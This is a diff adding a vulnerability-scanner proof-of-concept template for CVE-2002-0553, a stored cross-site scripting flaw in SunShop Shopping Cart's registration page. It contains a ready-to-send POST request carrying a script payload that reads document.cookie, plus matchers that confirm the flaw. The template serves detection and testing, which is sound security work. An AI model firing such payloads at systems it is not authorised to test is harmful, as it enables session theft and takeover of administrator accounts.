@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "SunShop Shopping Cart 1.5/2.x 新客户注册功能存在存储型跨站脚本漏洞（User-Embedded Scripting）。远程攻击者无需身份认证即可在注册表单字段中注入恶意脚本，当管理员在后台查看注册客户信息时脚本于管理员浏览器中执行，可窃取会话 Cookie 并获得管理权限。本 PoC 通过向注册接口提交携带 XSS 载荷的客户信息，检测服务器是否接受并回显该载荷以确认漏洞存在。"
+id = "POC-AVE-2002-0339"
+name = "CVE-2002-0553 PoC"
+severity = "high"
+tags = [
+    "cve-2002-0553",
+    "xss",
+    "stored-xss",
+]
+vuln_id = [
+    "CVE-2002-0553",
+    "AVE-2002-0339",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/createacct.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "firstname=<script>alert(document.cookie)</script>&lastname=test&email=xsstest@test.com&username=xsstest&password=test1234&password2=test1234"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(document.cookie)</script>"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Thank You",
+    "Your account has been created",
+    "Registration Successful",
+]
